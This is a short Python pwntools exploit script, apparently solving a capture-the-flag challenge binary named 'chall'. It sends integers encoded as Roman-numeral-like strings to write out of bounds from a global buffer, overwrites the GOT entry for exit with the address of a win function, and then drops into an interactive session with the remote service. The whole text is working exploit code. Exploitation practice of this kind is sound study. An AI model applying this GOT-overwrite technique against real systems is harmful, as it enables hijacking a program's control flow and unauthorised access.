import os
from pwn import *

BIN_NAME = 'chall'
REMOTE_ADDR = os.getenv("HOST", 'localhost')
REMOTE_PORT = os.getenv("PORT", "9000")

chall = ELF(BIN_NAME)
context.binary = chall

stream = remote(REMOTE_ADDR, int(REMOTE_PORT))

def sendint(num):
  num %= 65536
  res = b""
  for i, c in enumerate([b"I", b"X", b"C", b"M", b"\0"]):
    b = 10 ** i
    res += c * (num // b % 10)
  res = res[::-1]
  print(res)
  stream.sendlineafter(": ", res)
  return res

sendint((chall.got["exit"] - chall.symbols["buf"]) // 2)
sendint(chall.symbols["_Z3winv"])

stream.interactive()
